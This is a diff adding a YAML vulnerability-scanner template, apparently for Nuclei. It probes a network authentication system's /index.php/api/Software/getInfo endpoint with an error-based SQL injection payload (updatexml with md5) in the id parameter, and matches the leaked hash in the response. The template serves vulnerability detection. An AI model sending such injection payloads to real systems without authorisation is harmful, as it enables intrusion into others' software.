@@ -1,0 +1,27 @@
+id: Network-authentication-system-SQL
+
+info:
+  name: Network-authentication-system-SQL
+  author: HackTwo
+  severity: high
+  description: other
+  
+http:
+  - raw:
+      - |
+        POST /index.php/api/Software/getInfo HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        
+        data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200 && contains(body,'202cb962ac59075b964b07152d234b7')"
